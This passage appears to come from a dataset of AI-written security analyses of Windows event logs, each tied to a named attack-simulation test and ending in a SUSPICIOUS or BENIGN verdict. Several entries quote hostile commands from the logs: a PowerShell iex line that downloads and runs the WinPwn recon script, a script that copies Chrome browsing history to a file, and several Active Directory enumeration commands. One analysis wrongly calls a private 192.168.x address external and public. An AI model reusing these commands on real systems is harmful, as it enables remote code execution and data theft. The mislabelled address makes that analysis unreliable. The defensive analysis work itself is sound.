   - The execution path points to a temporary directory and involves relative path manipulation, often a tactic used in malicious activities.

3. **Security Privileges:**
   - There are event logs indicating the assignment of high-level privileges such as `SeDebugPrivilege`, `SeSecurityPrivilege`, and others to the ""admin_test"" user. Granting these privileges without clear justification can pose a significant security risk as they allow for extensive control over the system.

4. **Snaffler.exe Execution:**
   - The use of ""Snaffler.exe"", a known tool for enumerating file shares, suggests the possible scanning or data probing activity occurring on the machine. The activity involved execution with arguments to output possibly sensitive data to a temporary file, `$env:temp\\dataSnafflerOutput.txt`.

5. **Network Indicators:**
   - Logon events and elevated token usage by the ""admin_test"" user, particularly connecting from an external IP (`192.168.0.102`), suggest potential remote operations. The presence of a public IP might suggest remote connections that need validation.

### Assessment:
Based on the behavioral patterns observed through the logs, the activity is flagged as **SUSPICIOUS**. While clear signs of malicious compromise such as data exfiltration or privilege escalation attacks aren't explicitly confirmed, the combination of obfuscated PowerShell usage, the execution of a potentially intrusive tool (Snaffler.exe), and the high-level privileges acquired by the user warrant further investigation.

### Recommendations:
1. **Full Investigation:**
   - Conduct a deeper investigation to identify the source, intent, and potential impact of the PowerShell commands and the execution of ""Snaffler.exe"".
   - Verify the legitimacy of the tool usage. Determine if this was authorized activity and who initiated the execution.

2. **User Account Review:**
   - Review and audit the ""admin_test"" account activities, focusing on recent logins, privilege changes, and network activity.

3. **Network Security Monitoring:**
   - Monitor and log network traffic for connections from suspicious external IPs, ensuring that remote connection methodologies align with company policies.

4. **System Integrity Check:**
   - Perform a security review to ensure that the system remains uncompromised. This includes validating the hashes and origins of executed files.
  
5. **Security Policy Enforcement:**
   - Re-evaluate and strengthen security policies regarding privilege management, PowerShell script execution, encoded commands, and tool usage."
Enumerate Active Directory Computers with ADSISearcher,"Upon reviewing the provided Windows event logs from the CEO's machine, here is a detailed analysis regarding suspicious or anomalous activity:

### Analysis:

#### Windows PowerShell Logs:

- The `PowerShell` logs show the execution of a PowerShell command using `([adsisearcher]\""objectcategory=computer\"").FindAll(); ([adsisearcher]\""objectcategory=computer\"").FindOne()`. This command searches for computer objects within Active Directory. While not inherently malicious, running such queries could be part of enumeration activity by an attacker trying to map out network resources.

#### Sysmon Logs:

- The `Sysmon` logs indicate that several processes, like `wevtutil.exe`, `conhost.exe`, and `powershell.exe`, were executed by the user `admin_test`. 
- The frequent execution of `wevtutil.exe` can be suspicious if it's used to clear logs, but in this logs batch, there's no indication of the logs being cleared.
- Additionally, Powershell being launched from a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\`) might indicate script or command execution that bypasses common detection mechanisms. However, the command used aligns with what was found in the PowerShell log and does not seem immediately hostile.

#### Security Logs:

- The `Security` logs mostly reflect credential attempts and logons. Numerous events show unsuccessful access to the `MicrosoftAccount`, which might indicate an attempt to access online resources using domain accounts, though the errors (`ReturnCode=3221226021`) do not suggest successful logins.

#### System Logs:

- System logs indicate routine Windows Update activities and security intelligence updates for Microsoft Defender Antivirus, which is normal behavior and contributes to system maintenance.

#### Application Logs:

- The `Application` log confirms that Windows Defender was reported as on (`SECURITY_PRODUCT_STATE_ON`), indicating active security measures.

### Conclusion:

Based on the information contained in the logs, there is no definitive malicious activity. However, the enumeration activity seen in the PowerShell command execution could be considered abnormal, especially on a CEO's machine. This behavior warrants further investigation to ensure that it was conducted by a legitimate administrator or as part of an authorized script.

### Resolution:

Given the potential enumeration seen in the PowerShell logs and the abnormal, non-malicious behavior observed, the final resolution is:

- **SUSPICIOUS**

### Guidance:

1. **Verification**: Confirm whether the PowerShell activity was approved and conducted by a legitimate system administrator.
2. **Security Audit**: Conduct a security review of any credentials or accounts that were used around the time of the logs to ensure no unauthorized actions were taken.
3. **Monitoring**: Enhance monitoring on the CEO's machine and related accounts for any further suspicious developments.
"
WinPwn - GeneralRecon,"After analyzing the provided Windows event logs, several key observations and conclusions can be made regarding potentially malicious activity, particularly focusing on incidents related to PowerShell commands and their command-line arguments:

### Observations:

1. **Use of PowerShell with Suspicious Command-Line:**
   - The Sysmon log shows a PowerShell process (ProcessId: 5252) executed with a specific command-line that indicates the loading and execution of a script from a GitHub repository:
     ```shell
     powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), Generalrecon -consoleoutput -noninteractive}
     ```
   - The content of this script is being executed non-interactively and involves a reconnaissance function, which is a common behavior in initial compromise or lateral movement activities in cyber attacks.

2. **Integrity Level and User Context:**
   - The PowerShell process is running with high integrity level, which means it has elevated privileges or admin rights. This could potentially allow attackers to perform privilege escalation or execute sensitive commands.
   - The process runs under the user SERVER002\admin_test, indicating execution in a potentially sensitive and high-privilege context.

3. **Evidence of Scripting Execution:**
   - Upon reviewing the Windows PowerShell logs, several entries report the start and execution of the PowerShell session with the suspicious script parameters. This further supports the observation that the PowerShell session was initialized to execute potentially harmful scripts.

4. **The Presence of Specific Tools:**
   - The specific reference to a GitHub project ""S3cur3Th1sSh1t/WinPwn"" is notable as it is recognized as a repository that might contain scripts used for security assessments or possibly for unauthorized exploits depending on the context of use.

### Assessment:

Based on the logs and behavior observed:

- **SUSPICIOUS Activity:**
  - The PowerShell command executed in a non-interactive manner from an external script source is suspicious and often indicates an unauthorized attempt to run scripts designed to bypass traditional security measures.
  - The combination of elevated privileges and execution of potentially harmful scripts demands further investigation.

### Recommendations:

1. **Immediate Investigation:**
   - Investigate the `admin_test` user account to determine if these actions were authorized or if the account may have been compromised.
   - Review network and system activity logs to identify any unauthorized access or lateral movement attempts following the initial execution.

2. **Network and Host Monitoring:**
   - Increase monitoring for similar PowerShell command executions across other systems in the network.
   - Implement strict controls on PowerShell script execution, such as restricting execution policy and using application whitelisting.

3. **Conduct a Threat Hunt:**
   - Perform a threat hunt across the network to detect other instances of similar script execution patterns.
   - Collaborate with intelligence sources to identify if the observed behavior corresponds with known tactics, techniques, and procedures (TTPs) of existing threat actors.

In conclusion, the logs reveal behaviors indicative of suspicious activity, necessitating further investigation to ascertain the potential threat and take appropriate mitigative actions.
The final verdict on the situation is **SUSPICIOUS** due to the presence of potentially unauthorized or unintended activity requiring further investigation."
Permission Groups Discovery PowerShell (Domain),"In analyzing the provided logs, we aim to identify potential signs of malicious activity, focusing specifically on behaviors that might indicate a security threat to the Windows host, particularly the CEO machine.

### Suspicious or Anomalous Behavior:

1. **Process Execution Behavior:**
   - Multiple instances of commands like `whoami.exe`, `hostname.exe`, and `wevtutil.exe`. These are not inherently malicious but are often used by attackers to gather information about the system, especially `wevtutil.exe`, which is used to interact with Windows Event Log settings.
   - Frequent and clustered executions of these utilities can be indicative of recon activity or setup for potential breaches.
   
2. **PowerShell Activity:**
   - A PowerShell script is run using the command `get-ADPrincipalGroupMembership $env:USERNAME | select name`, which seeks Active Directory group memberships. While this command itself isn't inherently malicious, it is frequently used in post-exploitation stages to understand user privileges.
   
3. **High-Integrity Process Execution:**
   - The presence of processes running at a high integrity level (`whoami.exe`, `powershell.exe` and `wevtutil.exe`), can be expected in administrative tasks, but constant execution of these processes in a short timespan is unusual for normal operations and might suggest privilege escalation activities or staging for further attacks.

4. **EdgeUpdate and Related Executables:**
   - Sequence of events involving Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`, related setup executables and registration commands) being executed by `NT AUTHORITY\SYSTEM` indicates legitimate software update behavior. However, repeated processes showing up might warrant checking for malicious binaries masked as update utilities if this wasn't a scheduled maintenance window.

5. **Conhost.exe Instances:**
   - The Console Window Host (conhost.exe) is a legitimate process but frequent spawning as a child process could be associated with command-line executions by scripts for administrative tasks or during reconnaissance in attack scripts.

### Assessment of Malicious Activity:

- No explicit malware or anti-virus triggers are evident from the logs, which often relies on evidence of persistence mechanisms, communication with C2 servers, or exploit behavior.
- However, the combination of cmd utilities used for enumeration and PowerShell executions in quick succession is concerning, especially if unexpected by the system usage patterns.
- The activity could range from a legitimate script for administrative purposes due to software updates or system inventory to malicious reconnaissance depending on context.

### Conclusion and Resolution:

Based on the analysis, the event logs do contain **suspicious activities** that warrant further investigation to confirm whether they are benign administrative activities or preliminary steps in a targeted attack. The behavior is not decisively malicious given the lack of further exploitative patterns or external network connections, but the repetitive nature and clustering of system interrogation commands suggest unintended actions possibly symptomatic of an embedded script or triggered schedule unnoticed by the user.

**Resolution: SUSPICIOUS** 

### Guidance on How to Proceed:

1. **Further Investigation**:
   - Review the context around the powershell.exe and related command usage to determine if this was part of an IT script or unintended execution. Check for any scheduled tasks, GPO scripts, or potential automation logging that might match the event timeline.
   
2. **User Verification**:
   - Engage with the system user (admin_test or equivalent) or IT staff to confirm the intention of operations during this period.
   
3. **Behavior Monitoring**:
   - Implement additional monitoring on the host for any anomalous processes or network connections over the following days.
   
4. **Indicator Checks**:
   - Perform a system-wide scan for any known IOCs (Indicators of Compromise) or signs of persistence mechanisms that are common with known malicious actors.
   
5. **Policy Review**:
   - Review and update policies around high-integrity process execution to ensure logging and alerts are properly set to capture unauthorized or unexpected uses.

By following these steps, a more conclusive determination can be made regarding the nature and intent behind the suspicious events logged on the host."
Remote System Discovery - net group Domain Computers,"Upon analyzing the provided Windows event logs, here's a breakdown of the observations and analysis:

1. **Kernel and System Time Changes:**
   - Logs indicate multiple Kernel-General events where the system time was adjusted. The ""NewTime"" is set before the ""OldTime,"" indicating a time rollback; however, the reasons appear to stem from normal synchronization activities using Windows Time Service (`time.windows.com`).

2. **User Activity and Logons:**
   - The user ""admin_test"" has logged in with elevated privileges evidenced by EventID 4672 and 4624, indicating admin-level token privileges on multiple occasions. The logon type 3 indicates a network logon.

3. **Process Execution:**
   - **Sysmon logs show executions of:**
     - `whoami.exe`, `conhost.exe`: These are typical administrative tools. They don't inherently indicate malicious activity.
     - `cmd.exe` executing `net group ""Domain Computers"" /domain`: This command lists domain computers, which can be legitimate for administrative purposes but could also indicate reconnaissance activity.
     - Usage of `wevtutil.exe` to manage event logs, which is common but could obscure malicious activity.
   - Privileged access was used (e.g., `SeDebugPrivilege`), but not clear evidence linking it directly to a malicious act.
   - **Wuauclt.exe and AM_Delta.exe**: Normal Windows Update processes.

4. **Security Logs:**
   - Unusual time rollback events are logged but match the Kernel-General log indicating time synch activities without any evident malicious intent.
   - Failed credential-related activity through EventID 5379 indicates failed attempts at reading Microsoft Account credentials. They might relate to services rather than direct malicious attempts.

5. **Security Products:**
   - Security logs show Windows Defender operational and updated during this timeframe, indicating active security measures.

Overall, while there are activities suggesting domain reconnaissance, especially based on `cmd.exe` executions querying ""Domain Computers,"" this can fall within the range of legitimate administrative actions if performed by an authorized admin.

### Assessment and Conclusion:

- **Resolution:** SUSPICIOUS

The evidence indicates that although no definitive malicious activity (such as malware execution) is present, there are enough elements suggestive of potential deviation from regular activity (e.g., domain enumeration by `admin_test`). Further investigation is recommended to ensure these actions align with authorized administrative tasks, especially focusing on confirming ""admin_test"" actions are within expected parameters. Specifically, validate whether recent changes in administrative staff access, updates, or audit other logs around this period for corroboration of tasks.

### Guidance on How to Proceed:

1. **Verify User Authorization:**
   - Confirm with administrators whether the ""admin_test"" activities fall within approved tasks.

2. **Review Change Management:**
   - Check change management records for any scheduled or executed tasks by ""admin_test"" that could explain the domain queries.

3. **Monitor and Audit:**
   - Audit additional logs outside this period to check for any sustained or repeated querying activities.
   - Ensure all user activity, especially at admin levels, is compliant with security policy.

4. **Continuous Monitoring:**
   - Keep monitoring the system for similar behavior and ensure all security patches and endpoint profiles are current."
Extract chrome Browsing History,"Based on the analysis of the provided Windows event logs, here is a detailed assessment:

### Suspicious or Anomalous Behavior:
1. **Unusual PowerShell Execution:**
   - There are multiple instances of PowerShell being executed with the following command:
     ```
     powershell.exe & { $Username = (whoami).Split('\\')[1]; $URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?'; $History = Get-Content -Path ""$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique; $History | Out-File -FilePath ""$Env:USERPROFILE\Downloads\chromebrowsinghistory.txt""}
     ```
   - This script is reading the Google Chrome browsing history from a default user data path and writing it to a file in the user's Downloads folder. This behavior is typical of data extraction or monitoring scripts and is unusual if not part of known administrative tasks.

2. **Frequent Use of `whoami.exe`:**
   - `whoami.exe` is executed multiple times, which might indicate an attempt to verify user context repeatedly. This could be harmless but is often seen when attackers are ensuring they have the desired level of access.

3. **Execution of `wevtutil.exe`:**
   - `wevtutil.exe` is used frequently by the user `SERVER002\admin_test`. This utility can manage event logs, which includes clearing them. Without more context, this is suspicious activity, especially if it involves frequent log manipulations by non-standard admin accounts.

4. **Consistent Microsoft Edge Update Activity:**
   - Several processes related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`, etc.) are recorded. While this could be typical for update checks or installations, the number of instances appearing in a short timeline might need further verification against expected software update schedules.

### Indicators of Malicious Activity or Compromise:
- The PowerShell command execution that extracts web history implies potentially unauthorized monitoring or information gathering.
- Repeated execution of `whoami.exe` and `wevtutil.exe` by a user in a possibly non-routine scenario adds to the suspicion, reinforcing the possibility of intended obfuscation or data acquisition/preparation for exfiltration.

### Assessment and Recommended Resolution:
Based on the investigation, the logs contain several behaviors that are suspicious and could potentially indicate malicious activity, particularly due to the suspected monitoring action through PowerShell, which is atypical for standard processes.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:
1. **Further Investigation:**
   - Correlate these activities with any known administrative tasks scheduled at this time to rule out false positives.
   - Verify with IT or security operations if any team member executed these commands for legitimate purposes.
   
2. **Audit Accounts and Access:**
   - Check the legitimacy of `SERVER002\admin_test` activities and the account's recent login history.
   - Review permissions and ensure the principle of least privilege is adhered to.

3. **Data Collection:**
   - Gather additional logs and related security tool outputs, if available, to build a timeline of activity before and after these logs.
   - Look for any abnormal network connections or file access patterns related to the processes in question.

4. **Monitoring and Immediate Actions:**
   - Implement heightened monitoring on the affected machine for any further unusual behavior.
   - Depending on findings, consider isolating the system while a full assessment is performed to protect any potentially compromised data.

Take appropriate actions based on the outcome of the further investigation, considering escalation to incident response procedures if new evidence points strongly to malicious activity."
AWS - EC2 Security Group Enumeration,"**Detailed Analysis of the Logs:**

1. **Security Logs:**
   - The events logged under EventID 4616 are related to system time changes adjusted by the `svchost.exe` process. Such changes are usually mundane and occur due to system processes syncing the time. There are no indications of any privilege escalation or unauthorized alterations.

2. **Application Logs:**
   - The `Microsoft-Windows-Security-SPP` entry appears to document the normal operation of software protection services.
   - Events from `edgeupdate` indicate the stopping of the Edge Update service; however, this is a common event during regular update operations and is not inherently suspicious.

3. **System Logs:**
   - The logs capture time zone and time-change operations, likely part of routine system adjustments. These entries are tied to legitimate processes (`svchost.exe`), suggesting typical behavior with no evidence of tampering.

4. **Sysmon Logs:**
   - There is a series of entries involving `wevtutil.exe` and `conhost.exe` processes, executed by a user `SERVER002\admin_test`. `wevtutil` is a command-line utility for managing event logs which can be used for legitimate purposes or potentially malicious for log clearing or modifications. However, the context here (series of command executions) does not instantly denote malicious intent without further corroborating evidence.
   - Another significant part of the logs involves the execution of processes related to Microsoft Edge updates. These include `MicrosoftEdgeUpdate.exe`, along with various related executables. These processes run under `NT AUTHORITY\SYSTEM`, which is standard for software updates.
   - There are also instances of `cmd.exe` executing a command that involves AWS EC2 (`aws ec2 describe-security-groups`). This shows an interaction with AWS services, which might be unexplained if not part of known behavior for this machine or user.

**Assessment of the Situation:**
- The logs predominantly show legitimate system and application processes related to time adjustments and software updates with `svchost.exe` and Microsoft Edge Update activities.
- `wevtutil` and `conhost` logs could hint at administrative task scripts or preparations; however, no direct evidence of malicious actions like log deletion was detected.
- Command line execution using `cmd.exe` for accessing AWS EC2 might be part of an automated script or routine task. It would be suspicious if this does not align with known tasks performed by the `admin_test` user or the role of the systems involved.

**Guidance on How to Proceed:**
- Cross-reference with scheduled tasks, system update logs, and review typical Edge update processes. Confirm if the update sequence is standard.
- Verify if `ADMIN_TEST` user activity and AWS interactions fall within expected usage patterns. Investigate any deviations.
- Conduct a review of endpoint protection logs and network communication if available, to ensure no lateral movement or data exfiltration occurred.
- Regularly monitor for any follow-up triggering indicating the behavior observed in these logs escalates or correlates with other data points indicative of a larger threat.

**Resolution:** SUSPICIOUS

This resolution is primarily due to the AWS-related command shown in the command line and the potential unexplained use of `wevtutil.exe` by an admin user, both needing further investigation to confirm the intent and legitimacy."
Check computer location,"Upon analyzing the provided log entries, a few points of interest are noted:

1. **Time Changes**: The Security and System logs show a couple of events related to time changes (Event ID 4616). The `svchost.exe` process is responsible, which acts as a host process for Windows services. While time changes can be legitimate (e.g., due to synchronization with time.windows.com), it's important to confirm this with NTP or time server configurations and any requested changes.

2. **Process Executions**:
   - The Sysmon logs show several executions of `wevtutil.exe` and `conhost.exe` associated with the user `SERVER002\\admin_test`. `wevtutil.exe` is a legitimate Microsoft executable used to manage Windows event logs, but if misused, it could indicate someone attempting to purport event logs. 
   - The execution of `cmd.exe` with the command `reg query ""HKEY_CURRENT_USER\\Control Panel\\International\\Geo""` appears to be a query for user geo settings. While benign by itself, it could be part of broader reconnaissance efforts if combined with other suspicious activities.

3. **Software Updates**: Numerous entries appear related to Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe` and associated processes) under `NT AUTHORITY\\SYSTEM`. These operations seem automated or scheduled system updates. The executables and their file paths seem to legit align with Microsoft Edge's update mechanism used to maintain or upgrade the Edge browser.

4. **Processes with High Integrity Levels**: There are processes (`whoami.exe`, `cmd.exe`) executed with high integrity levels. While normal in some situations, high privileges in use by a non-standard script or process would require further inspection to see if it's part of an intended administrative action or misuse.

5. **Potential Anomalies**:
   - Frequent use of internal Windows tools (`whoami.exe`, `hostname.exe`, `reg.exe`) could suggest enumeration attempts. The presence of high integrity levels and specific registry queries align with typical reconnaissance techniques an attacker might use once gaining a foothold.

6. **Edge Update Behavior**: The detailed executions and service events for Edge Update seem legitimate, as these updates generally occur silently. However, it's noteworthy that these processes are running with system-level privileges and interact with various system directories.

### Assessment:
The behavior observed across these logs is multi-faceted, involving legitimate system processes in contexts that could be considered suspicious if the intention of use isn't clear (i.e., system maintenance vs. unauthorized access). There are traces of system tools being used in a manner that could be consistent with internal reconnaissance or malware pose, particularly if not initiated by expected administrators.

### Resolution: SUSPICIOUS

**Recommendations for Next Steps**:
- **Verify Time Changes**: Ensure the activity correlates with known NTP server activities or administrative actions.
- **Confirm Administrative Actions**: Determine if `SERVER002\\admin_test` manually orchestrated the processes (a legitimate administrative task) or if it's unauthorized.
- **Investigate Edge Update**: While it appears legitimate, ensure no unauthorized modifications or replacements of the Edge binaries occurred (check hashes against known good values if needed).
- **Monitor Continued Activity**: Implement additional monitoring on `SERVER002` to validate user actions and lookout for further evidence of misuse.
- **Validate User Privileges**: Check user privileges for the `admin_test` account and rectify any unnecessary elevated rights if found incorrect.

If continued activity indicates more definite signs of malicious intent, escalate investigations with enhanced logging and potential user account audit or suspension until activity can be verified and determined."
System Time Discovery,"After reviewing the provided Windows event logs, here is a detailed analysis:

### Analysis:

1. **System Logs:**
   - Routine system events are logged, such as Windows Update completion and time synchronization with a known NTP server (""time.windows.com"").
   - Time changes noted in the logs appear related to system time adjustment based on NTP synchronization, which is normal behavior.

2. **Application Logs:**
   - Logs primarily indicate the stopping of services for ""edgeupdate.""
   - The presence of ""edgeupdate"" refers to Microsoft's Edge browser automatic update service and its behavior appears normal.

3. **Security Logs:**
   - Event ID 4616 indicates a change in system time with service account involvement (""LOCAL SERVICE""), consistent with time synchronization.

4. **Sysmon Logs:**
   - Execution of common administrative commands and system utilities is observed (e.g., `whoami.exe`, `cmd.exe`, `net.exe`, `w32tm.exe`).
   - A command like `""cmd.exe"" /c net time \\localhost & w32tm /tz` is typically used to verify and synchronize system time.
   - Processes related to Microsoft's Edge auto-update service (`MicrosoftEdgeUpdate.exe`) are executed multiple times. This aligns with expected behavior during a software update cycle.
   - The execution of `sppsvc.exe` linked with the Software Protection Platform is normal for license management tasks.

### Indicators of Potential Concern:
- There is no evidence of privilege escalation, unauthorized process execution, suspicious command-line arguments, or anomalous user behaviors within the log entries provided.
- The processes observed are executed under the NT AUTHORITY\SYSTEM context, which is typical for system services and updates.

### Conclusion:
The logs do not present any indicators of compromise or malicious activities. All logged events appear to indicate routine system maintenance and software updates, particularly related to the Microsoft Edge browser.

### Resolution: BENIGN

The activities observed are consistent with expected behaviors for the tasks logged, including system updates and time synchronization. No further investigation or actions are deemed necessary based on the current evidence."
Enumerate Active Directory Groups with ADSISearcher,"**Detailed Analysis of the Logs:**

1. **Process Execution:**
   - The logs show the execution of several standard Windows utilities such as `hostname.exe`, `whoami.exe`, `conhost.exe`, and `wevtutil.exe` from the `SYSTEM32` directory. These applications are legitimate Windows utilities and their presence alone does not indicate malicious activity.
   - However, there is a noteworthy event where `powershell.exe` was executed with a specific command: `([adsisearcher]""objectcategory=group"").FindAll(); ([adsisearcher]""objectcategory=group"").FindOne()`. This command is used to query Active Directory (AD) groups, and though it can be part of legitimate administration tasks, unauthorized use might indicate lateral movement or privilege enumeration attempts.

2. **Command-Line Arguments:**
   - `conhost.exe` appears frequently with command-line argument `0xffffffff -ForceV1`. This is typical for console operations and does not specifically denote malicious activity.
   - The PowerShell command demonstrates a potential interest in gathering information about AD group configurations, which could signify reconnaissance activities especially if operated by an unauthorized user.

3. **Time Change Even:**
   - Time alteration was registered by the system (`EventID: 4616`). This change was initiated by `svchost.exe`, a legitimate service host process, under the `LOCAL SERVICE` account. Sudden changes in system time can sometimes be an indicator of tampering or could be benign due to legitimate configuration updates or synchronization with a time server, which appears to be the case observing `time.windows.com`.

4. **Process Integrity Levels:**
   - All processes executed by the user `SERVER002\\admin_test` ran at a `High` integrity level, which indicates these were running with administrative privileges. It’s crucial if these process instances are executed by valid administrative accounts.

5. **Pattern of Activity:**
   - A pattern shows the sequential execution of commands to gather hostnames and user information, followed by AD group querying. These sequences depict a scenario that could line up with either standard administrative scripting or indicative of a scripted reconnaissance or post-exploitation maneuver.

**Assessment of the Situation:**

- **Suspicious Activity:** 
  - The use of PowerShell with a command to query AD information is suspicious, especially if this activity was unexpected or not conducted by IT staff. The PowerShell script was executed under a user `admin_test`, and verification if this account's activities align with expected behavior is necessary.
  
- **Time Change Activity:**
  - The time change trigger is benign given the context of time synchronization.

**Threats/Risks Identified:**
- Potential Privilege Enumeration: Someone may be attempting to gather information on AD group memberships which could be used for further exploitation if the logged-on account used is compromised or misconfigured.
  
**Guidance:**

1. **Further Investigation:**
   - Confirm with IT department or logs whether the `admin_test` account operation of PowerShell scripts was authorized and expected.
   - Analyze network activity logs and AD audit logs during the specified timeframe for additional suspicious activities that support the compromise hypothesis.

2. **Assess User Credentials:**
   - Verify the integrity and rightful ownership of the `SERVER002\\admin_test` account on the observed system to rule out account misuse.

3. **Initiate Threat Hunts:**
   - Consider conducting a broader review involving scripts executed on the network and scan other systems for similar activities.

4. **Improve Monitoring:**
   - Enhance monitoring and detection for PowerShell activities with specific flags indicating potential misuse and regular reports on service accounts' operations.

**Resolution:**
- **SUSPICIOUS**: The logs contain activity that is genuinely suspicious and warrants further investigation to verify if any unauthorized access or misuse took place."
Enumerate Active Directory Groups with Get-AdGroup,"Upon reviewing the provided Windows event logs, here is a detailed analysis and assessment of the situation:

### Analysis:

#### Windows PowerShell Log:
- **Activity Observed**: PowerShell was executed with `Get-AdGroup -Filter *` command.
- **Suspicion**: The command is used for retrieving Active Directory groups which is common in administrative operations. However, given this was executed from the CEO's machine, it's essential to verify if this aligns with typical user activities or might be part of unauthorized reconnaissance activity.

#### Sysmon Log:
- **Process Execution**: 
  - Multiple instances of `wevtutil.exe` and `conhost.exe` have been logged. Both are legitimate system utilities; however, `wevtutil.exe` can be used for log manipulation.
  - Various instances of `MicrosoftEdgeUpdate.exe`, `whoami.exe`, `hostname.exe`, and `powershell.exe` were observed, indicating routine operations or scripted tasks. 
  - The high integrity level with `powershell.exe` usage by `admin_test` suggests administrative operations.
  
- **Anomalous Patterns**: Frequent process creations around the same timestamp could indicate automation or scripted tasks rather than typical user interaction.
  
#### Security Log:
- **Privilege Escalation**: 
  - User `admin_test` is granted numerous privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, which suggests the user operates with high-level administrative permissions.
  
- **Logon Behavior**: 
  - Logon events using NTLM and Type 3 (network) do not immediately indicate an anomaly but warrant cross-verification with known access patterns to ensure legitimacy.
  
#### System Log:
- **Time Changes**:
  - Events indicating backdating or correction of system time could be legitimate time synchronizations but could also indicate attempts to adjust logs, although there is no direct evidence of such activity in the logs.

#### Application Log:
- **EdgeUpdate Service**:
  - Several logs involving `MicrosoftEdgeUpdate.exe` stopping and starting may indicate routine updates or potential interference with services.

### Assessment:
Based on the information currently available, there is no direct evidence of overtly malicious activity. However, the presence of high-privilege process executions, the invocation of potentially sensitive commands (`whoami.exe`, `powershell.exe` for getting AD groups), and frequent process creation may indicate a need for further investigation.

### Resolution:
- **SUSPICIOUS**: The activity noted in the logs requires further investigation. It's critical to validate whether `admin_test` performing such actions aligns with normal operational patterns and to ensure there is no unauthorized access or script execution.

### Recommendations:
1. **User Activity Review**: Examine `admin_test`'s activities on that day to align with expected tasks.
2. **PowerShell Activity**: Verify the purpose and necessity of retrieving all AD groups from the CEO's device.
3. **Log Integrity Check**: Ensure processes such as `wevtutil.exe` were not used to alter log files.
4. **Configuration Review**: Inspect any scripts or automated tasks that may execute PowerShell commands with high privileges.
5. **Monitoring**: Increase monitoring on privileged accounts to detect any unusual patterns of behavior.

This approach will help ensure any potential risks are adequately mitigated and legitimate activities are confirmed."
Remote Desktop Services Discovery via PowerShell,"After analyzing the provided Windows event logs, here is a detailed breakdown of the findings:

### General Observations:
1. **Time Changes:**
   - The system time was adjusted twice, as indicated by the Windows Kernel-General Event IDs 24 and 1. This typically indicates either manual time changes or automatic synchronization with a time server. The adjustments in such a short span could be questionable if it wasn't scheduled or necessary.

2. **System Processes:**
   - Common system processes such as `svchost.exe`, `wevtutil.exe`, and others are seen running, which typically manage Windows services and event logs.
   - There are multiple occurrences of processes like `wevtutil.exe` and `conhost.exe` executed by `admin_test` user, seemingly managing event logs.

3. **User Activity (admin_test):**
   - The user 'admin_test' executed several processes (e.g., `hostname.exe`, `whoami.exe`, and `powershell.exe`). The use of command-line utilities like these could be part of regular administrative tasks or exploratory actions possibly indicating a manual inspection or configuration adjustment.
   - The PowerShell command was executed to get service statuses for ""Remote Desktop Services"" and ""Remote Desktop Configuration"", which could be a benign administrative action or a precursor to enabling remote access.

4. **Security Logs:**
   - Privileged logons were recorded for the 'admin_test' user with several high-level privileges granted (Event ID 4672). The presence of privileges such as `SeDebugPrivilege` can pose a risk if misused.
   - The appearance of NTLM authentication and specific logon types (LogonType 3 referring to a network logon) are typical for remote access.

5. **Application Logs:**
   - Regular entries for normal operation, such as those from Microsoft Edge or Software Protection Platform Service, are present.

6. **Windows PowerShell Logs:**
   - Indicate revision of remote services, which again ties into potential configurations for remote connectivity.

7. **Sysmon Logs:**
   - Indicate multiple processes running by the same user 'admin_test'. Frequent execution of administrative tools and system utilities is noted and can indicate either maintenance or nefarious probing.

### Assessment:
- **Suspicious Activity:**
  - Overall, the changes in system time and multiple unusual console applications initiated by 'admin_test' in quick succession without clear cause could suggest something outside typical behavior patterns. The presence of NTLM authentication and elevated privileges provided draws attention to potential misuse. 
  - However, there is no direct evidence of malicious activity, such as known malicious executables or irregular network connections in these logs.

- **Possible Threats/Risks:**
  - Elevated privileges acquired by 'admin_test' can grant the ability to perform malicious activities.
  - The execution of system tools and utilities, while permissible for administrators, can also serve as reconnaissance or configuration changes for unauthorized remote control.
  
### Conclusion:
Based on the current findings, while there are signs of unusual behavior such as frequent process execution by 'admin_test', the evidence does not explicitly confirm malicious activity but does suggest further investigation.

**Resolution:** **SUSPICIOUS**

### Recommended Actions:
1. **Further Investigation:**
   - Review the justification for time updates and the frequency of such changes against established baselines.
   - Investigate the actions of 'admin_test' to determine if execution of administrative commands was authorized and warranted.
   - Check configurations or recent changes particularly related to remote access services.
   - Conduct an endpoint detection review for anomalies in network traffic or file integrity issues.

2. **Security Audit:**
   - Conduct a detailed audit of user privileges to ensure compliance with least privilege principles.
   - Validate the security patches and software updates status, especially concerning NTLM vulnerabilities.

3. **Monitoring:**
   - Increase monitoring on the server, setting alerts on specific admin operations and privilege escalations.
   - Ensure logging configurations capture detailed audit logs for all administrative activities moving forward."
Port Scan using python,"Based on the analysis of the provided Windows event logs, the following suspicious and potentially malicious activities have been identified:

1. **PowerShell Activity**:
   - The logs show the use of PowerShell to create directories and download a Python installer from an external website (`https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe`) followed by a silent installation with specific arguments (`/quiet InstallAllUsers=1 PrependPath=1 Include_test=0`). The use of PowerShell to download and install software, especially with silent arguments and from an external source, can be indicative of malicious behavior typically associated with attempts to bypass user consent and install potentially unwanted or malicious applications.

2. **Security Log Anomalies**:
   - The `CompatTelRunner.exe` process (Microsoft Compatibility Telemetry) is frequently querying various user accounts like `Guest`, `Administrator`, `DefaultAccount`, and other non-standard accounts (`admin_test`, `lplui`, `sshd`, `testing`, `WDAGUtilityAccount`). This activity is unusual as `CompatTelRunner.exe` is generally not expected to interact with user account management. It might indicate an attempt of privilege escalation or reconnaissance.

3. **Sysmon Activity**:
   - Execution of `whoami.exe`, `hostname.exe`, and `CompatTelRunner.exe` by a user (`SERVER002\admin_test`) indicates attempts to gather system and user information for further actions, which can be seen during recon phases of attacks.
